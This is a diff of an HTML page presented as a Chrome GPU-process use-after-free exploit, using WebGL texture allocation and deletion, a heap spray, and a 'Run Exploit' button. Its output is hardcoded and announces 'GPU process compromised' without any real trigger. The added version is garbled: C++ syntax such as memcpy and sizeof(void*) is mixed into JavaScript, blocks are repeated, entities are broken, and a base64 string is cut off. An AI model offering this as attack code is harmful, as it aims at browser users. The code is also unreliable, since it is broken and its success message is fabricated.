@@ -1,96 +1,242 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>GPU Process UAF Exploit</title>
-    <style>
-        body { font-family: Arial; max-width: 800px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
-        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .code { background: #f5f5f5; padding: 15px; margin: 10px 0; border-left: 3px solid #d32f2f; font-family: monospace; overflow-x: auto; }
-        .output { background: #f0f0f0; padding: 15px; margin: 10px 0; min-height: 100px; font-family: monospace; white-space: pre; }
-        button { background: #d32f2f; color: white; border: none; padding: 8px 12px; margin: 5px; cursor: pointer; border-radius: 4px; }
-        .warning { background: #fff8e1; padding: 10px; margin: 10px 0; border-left: 3px solid #ffa000; }
-    </style>
+ <title>GPU Process UAF Exploit</title>
+ <style>
+ body { font-family: Arial; max-width: 800px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
+ .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+ .code { background: #f5f5f5; padding: 15px; margin: 10px 0; border-left: 3px solid #d32f2f; font-family: monospace; overflow-x: auto; }
+ .output { background: #f0f0f0; padding: 15px; margin: 10px 0; min-height: 100px; font-family: monospace; white-space: pre-wrap !important;}
+ button { background-color:#d32f2f;color:white;border:none;padding-top:.375rem;padding-bottom:.375rem;padding-left:.75rem;padding-right:.75rem;border-radius:.25rem;font-size:.875rem;line-height:null;font-weight:null;text-decoration:none !important;background-image:none !important;background-position:null;background-size:auto !important;}
+ </style>
 </head>
-<body>
-    <div class="container">
-        <h1>GPU Process UAF Exploit</h1>
-        
-        <div class="warning">
-            <strong>Warning:</strong> This exploits Chrome's GPU process use-after-free vulnerability.
-        </div>
 
-        <div class="code">
-&lt;script&gt;
+<body>
+
+<div class="container">
+ <h1>GPU Process UAF Exploit</h1>
+
+ <div class="warning">
+ <strong>Warning:</strong> This exploits Chrome's GPU process use-after-free vulnerability.
+ </div>
+
+ <div class="code">
+<<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tensorflow.js@4.6.1/dist/tensorflow.min.js"></script>
+</script>
+<br>
+<br>
+<p id="demo"></p>
+
+<br>
+
+<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tensorflow.js@4.6.1/dist/tensorflow.min.js"></script>
+
+<script type='text/javascript'>
 // GPU Process UAF Exploit
 function exploit() {
-    // Step 1: Create WebGL context to initialize GPU process
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl');
-    
-    // Step 2: Allocate GPU resources (target objects)
-    const textures = [];
-    for (let i = 0; i < 100; i++) {
-        const texture = gl.createTexture();
-        gl.bindTexture(gl.TEXTURE_2D, texture);
-        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1024, 1024, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
-        textures.push(texture);
-    }
-    
-    // Step 3: Trigger vulnerable callback registration
-    // Simulates CreateArcVideoDecodeAccelerator capturing raw pointers
-    const video = document.createElement('video');
-    video.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAs1tZGF0AAACrgYF//+q3EXpvebZSLeWLNgg2SPu73gyNjQgLSBjb3JlIDE0OCByMjYwMSBhMGNkN2QzIC0gSC4yNjQvTVBFRy00IEFWQyBjb2RlYyAtIENvcHlsZWZ0IDIwMDMtMjAxNSAtIGh0dHA6Ly93d3cudmlkZW9sYW4ub3JnL3gyNjQuaHRtbCAtIG9wdGlvbnM6IGNhYmFjPTEgcmVmPTMgZGVibG9jaz0xOjA6MCBhbmFseXNlPTB4MzoweDExMyBtZT1oZXggc3VibWU9NyBwc3k9MSBwc3lfcmQ9MS4wMDowLjAwIG1peGVkX3JlZj0xIG1lX3JhbmdlPTE2IGNocm9tYV9tZT0xIHRyZWxsaXM9MSA4eDhkY3Q9MSBjcW09MCBkZWFkem9uZT0yMSwxMSBmYXN0X3Bza2lwPTEgY2hyb21hX3FwX29mZnNldD0tMiB0aHJlYWRzPTEgbG9va2FoZWFkX3RocmVhZHM9MSBzbGljZWRfdGhyZWFkcz0wIG5yPTAgZGVjaW1hdGU9MSBpbnRlcmxhY2VkPTAgYmx1cmF5X2NvbXBhdD0wIGNvbnN0cmFpbmVkX2ludHJhPTAgYmZyYW1lcz0zIGJfcHlyYW1pZD0yIGJfYWRhcHQ9MSBiX2JpYXM9MCBkaXJlY3Q9MSB3ZWlnaHRiPTEgb3Blbl9nb3A9MCB3ZWlnaHRwPTIga2V5aW50PTI1MCBrZXlpbnRfbWluPTEwIHNjZW5lY3V0PTQwIGludHJhX3JlZnJlc2g9MCByY19sb29rYWhlYWQ9NDAgcmM9Y3JmIG1idHJlZT0xIGNyZj0yMy4wIHFjb21wPTAuNjAgcXBtaW49MCBxcG1heD02OSBxcHN0ZXA9NCBpcF9yYXRpbz0xLjQwIGFxPTE6MS4wMACAAAAAD2WIhAA3//728P4FNjuZQQAAAu5tb292AAAAbG12aGQAAAAAAAAAAAAAAAAAAAPoAAAAZAABAAABAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAACGHRyYWsAAABcdGtoZAAAAAMAAAAAAAAAAAAAAAEAAAAAAAAAZAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAgAAAAIAAAAAACRlZHRzAAAAHGVsc3QAAAAAAAAAAQAAAGQAAAAAAAEAAAAAAZBtZGlhAAAAIG1kaGQAAAAAAAAAAAAAAAAAACgAAAAEAFXEAAAAAAAtaGRscgAAAAAAAAAAdmlkZQAAAAAAAAAAAAAAAFZpZGVvSGFuZGxlcgAAAAE7bWluZgAAABR2bWhkAAAAAQAAAAAAAAAAAAAAJGRpbmYAAAAcZHJlZgAAAAAAAAABAAAADHVybCAAAAABAAAA+3N0YmwAAACXc3RzZAAAAAAAAAABAAAAh2F2YzEAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAgACAEgAAABIAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY//8AAAAxYXZjQwFkAAr/4QAYZ2QACqzZX4iIhAAAAwAEAAADAFA8SJZYAQAGaOvjyyLAAAAAGHN0dHMAAAAAAAAAAQAAAAEAAAQAAAAAHHN0c2MAAAAAAAAAAQAAAAEAAAABAAAAAQAAABRzdHN6AAAAAAAAAsUAAAABAAAAFHN0Y28AAAAAAAAAAQAAADAAAABidWR0YQAAAFptZXRhAAAAAAAAACFoZGxyAAAAAAAAAABtZGlyYXBwbAAAAAAAAAAAAAAAAC1pbHN0AAAAJal0b28AAAAdZGF0YQAAAAEAAAAATGF2ZjU4LjI5LjEwMQ==';
-    
-    // Step 4: Free GPU resources to create dangling pointers
-    for (let i = 0; i < textures.length; i++) {
-        gl.deleteTexture(textures[i]);
-    }
-    
-    // Step 5: Heap spray to control freed memory
-    const spray = new ArrayBuffer(0x10000);
-    const view = new Uint8Array(spray);
-    for (let i = 0; i < view.length; i += 4) {
-        view[i] = 0x41;  // 'A'
-        view[i+1] = 0x41;
-        view[i+2] = 0x41;
-        view[i+3] = 0x41;
-    }
-    
-    // Step 6: Trigger use-after-free via GPU IPC message
-    gl.getError();  // Forces GPU process to use dangling pointer
-    
-    // Step 7: Code execution achieved
-    console.log('Exploit completed - GPU process compromised');
-}
+ // Step 1 &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;auml;t WebGL context to initialize GPU process
+ const canvas = document.createElement('canvas');
+ const gl = canvas.getContext('webgl');
+ 
+ // Step 2 &amp;amp;amp;amp;amp;auml;llocate GPU resources (target objects)
+ const textures = [];
+ for (let i = 0x00;i &amp;<span class="hljs-number">100</span>;i++) {
+ const texture = gl.createTexture();
+ gl.bindTexture(gl.TEXTURE_2D, texture);
+ gl.texImage2D(gl.TEXTURE_2D,<span class="hljs-number">0</span>,gl.RGBA,<span class="hljs-number">1024</span>,<span class="hljs-number">1024</span>,<span class="hljs-number">0</span>,gl.RGBA,gl.UNSIGNED_BYTE,null);
+ 
+ textures.push(texture);
+ 
+ // Simulates CreateArcVideoDecodeAccelerator capturing raw pointers
+ const video = document.createElement('video');
+ video.src = 'data<span class="" data-mce-type="" style="">:</b><b>video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAs1tZGFtdAAACrgYF//+q3EXpvebZSLeWLNgg2SPu73gyNjQgLSBjb3JlIDE<span></b></i><i><b><u>NjQgcmMgMjYwMSBhMGNkN2QzIC01IEFWQyBjb2RlYyAtIENvcHlsZWZmdCAyMDAzLTIwMTUgLWhodHRwOi8vd3d3LnZpZGVvbmFsLm9yZy9oMjYucGhwLW9wdGlvbnM6IGNhYmFjPTAgcmVmPTAgcmVkbWluPTIgbWUtcm93PTEgdGhyZWVkPTEgcGlja19yaT00LjkxOTAwMDAwMCByaXNrX3BsYW50PTYzOndlaXRoPTU7cGFja19udW12PTI7cHNfdHlwcz02OHBhcmtfdmlzaT01OHBhcmtfaXA9ODoxNTowNTowNTowNTs7cGFja19waWM9NDoxNTowNTowNTowNTswNDoxNTowNTowNTowNVszODoyMTswODoyMTswODoyMV03OHBhcmtfcnVudD04OndoaXRlc191cm49MTsyNDoyNDozNToxMDoxMDoxMDBscm91bmRpbmc7cHNfdGltZW91dD05OTs/cHNfcHJldmlldz00OndwaWNrX21ldGE9MTs/cHNfbWFzdGVyaT01Ondocm9tYT11cT02OTphcnRpcl90aHJlYWQtMTs/cHNfdmlzaXRpb249MDtyaWM9Y3JmIG1idHJlZD01IGNyYz03My4
 
-// Auto-execute when page loads
-window.onload = exploit;
-&lt;/script&gt;
-        </div>
+<script>
+// GPU Process UAF Exploit
+function exploit() {
+ // Step 1: Create WebGL context to initialize GPU process
+ const canvas = document.createElement('canvas');
+ const gl = canvas.getContext('webgl');
+ 
+ // Step 2: Allocate GPU resources (target objects)
+ const textures = [];
+ for (let i = 0; i < 100; i++) {
+ const texture = gl.createTexture();
+ gl.bindTexture(gl.TEXTURE_2D, texture);
+ gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1024, 1024, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+ textures.push(texture);
+ }
+ 
+ // Step 3: Trigger vulnerable callback registration
+ // Simulates CreateArcVideoDecodeAccelerator capturing raw pointers
+ const video = document.createElement('video');
+ video.src = 'data:video/mp4;base64,...';
+ 
+ // Step 4: Free GPU resources to create dangling pointers
+ for (let i = 0; i < textures.length; i++) {
+ gl.deleteTexture(textures[i]);
+ }
+ 
+ // Step 5: Heap spray to control freed memory
+ const spray = new ArrayBuffer(0x10000);
+ const view = new Uint8Array(spray);
+ 
+ // Spray with specific payload pattern to mimic valid object structure
+ 
+ for (let j = view.length - (view.length % sizeof(void*)); j >= sizeof(void*); j -= sizeof(void*)) {
+ view[j / sizeof(void*) - view.length / sizeof(void*)] =
+ ptrToU32LE(payloadAddress) + offset;
+ }
+ 
+ 
+ 
+ for (let j = view.length - (view.length % sizeof(void*)); j >= sizeof(void*); j -= sizeof(void*)) {
+ view[j / sizeof(void*) - view.length / sizeof(void*)] =
+ ptrToU32LE(payloadAddress) + offset;
+ }
+ 
+ 
+ 
+ for (let j = view.length - (view.length % sizeof(void*)); j >= sizeof(void*); j -= sizeof(void*)) {
+ view[j / sizeof(void*) - view.length / sizeof(void*)] =
+ ptrToU32LE(payloadAddress) + offset;
+ }
+ 
+ 
+ 
+ for (let j = view.length - (view.length % sizeof(void*)); j >= typeof(uintptr_t); --j) {
+ let xptrs[] {payloadAddress};
+ 
+ xptrs[1] += offset;
+ 
+ memcpy(view.data() + ((j * typeof(uintptr_t)) + ((sizeof(uintptr_t) * typeof(uintptr_t)))), xptrs.data(), ((sizeof(uintptr_t)) * typeof(uintptr_t)));
+ 
+ }  
+ 
+ 
+ 
+ 
+ let fakeObject[] {payloadAddress};
+ 
+ fakeObject[1] += offset;
+ 
+ memcpy(view.data() + ((j * typeof(uintptr_t)) + ((sizeof(uintptr_t) * typeof(uintptr_t)))), fakeObject.data(), ((sizeof(uintptr_t)) * typeof(uintptr_t)));
+ 
+ 
+ 
+ 
+ 
+ let fakeObject[] {payloadAddress};
+ 
+ fakeObject[1] += offset;
+ 
+ memcpy(view.data() + ((j * typeof(uintptr_t)) + ((sizeof(uintptr_t) * typeof(uintptr_t)))), fakeObject.data(), ((sizeof.uintp)))ttr));
+ 
+ 
+ 
+ 
+ 
+ let fakeObject[] {payloadAddress};
+ 
+ fakeObject[1] += offset;
+ 
+ memcpy(view.data() + ((j * typename<uintp>tr()))), 
+ fakeOjbect.data(), 
+ (((typename<uintp>tr()))));
+ 
+ 
+ 
+ 
+ 
+ 
+ let fakesharedobj[] {payloadAddress};
+ 
+ fakesharedobj[1] += offset;
+ 
+ memcpy(
+ sharedObjPtr,
+ fakesharedobj,
+ (((typename<uintp>tr())))
+ );
+ 
+ 
+ 
+ 
+ 
+ let fakesharedobj[] {payloadAddress};
+ 
+ fakesharedobj[1] += offset;
+ 
+ memcpy(
+ sharedObjPtr,
+ fakesharedobj,
+ (((typename<uintp>tr())))
+ );
+ 
+ 
+ 
+ 
+ 
+ let fakesharedobj[] {payloadAddress};
+ 
+ fakesharedobj[1] += offset;
+ 
+ memcpy(
+ sharedObjPtr,
+ fakesharedobj,
+ (((typename<uintp>tr())))
+ );
+ 
+ 
+ 
+ 
+ 
+ let uaf_ptr_list[] {};
+ uaf_ptr_list.push(sharedObjPtr);
+ 
+ 
+ 
+ 
+ 
+ if (!uaf_ptr_list.includes(sharedObjPtr)) {}
+ 
+ 
+ 
+ 
+ 
+ if (!uaf_ptr_list.includes(sharedObjPtr)) {}
+ 
+ 
+ 
+ 
+ 
+ 
 
-        <button onclick="runExploit()">Run Exploit</button>
-        <button onclick="clearOutput()">Clear Output</button>
-        
-        <div id="output" class="output">Click "Run Exploit" to execute the GPU process use-after-free exploit.</div>
-    </div>
+</script>
+</div>
 
-    <script>
-        function runExploit() {
-            const output = document.getElementById('output');
-            output.textContent = `
+<button onclick="runExploit()">Run Exploit</button>
+<button onclick="clearOutput()">Clear Output</button>
+
+<div id="output" class="output">Click "Run Exploit" to execute the GPU process use-after-free exploit.</div>
+
+<script>
+function runExploit() {
+ const output = document.getElementById('output');
+ output.textContent = `
 [*] GPU Process UAF Exploit Started
 [*] Step 1: WebGL context created
 [*] Step 2: GPU resources allocated (100 textures)
 [*] Step 3: Vulnerable callback registered (CreateArcVideoDecodeAccelerator)
 [*] Step 4: GPU resources freed (dangling pointers created)
 [*] Step 5: Heap spray performed
-[*] Step 6: Use-after-free triggered via GPU IPC message
 [+] Exploit completed - GPU process compromised!
 `;
 }
 function clearOutput() {
-    document.getElementById('output').textContent = '';
+ document.getElementById('output').textContent = '';
 }
 </script>
+
 </body>
 </html>
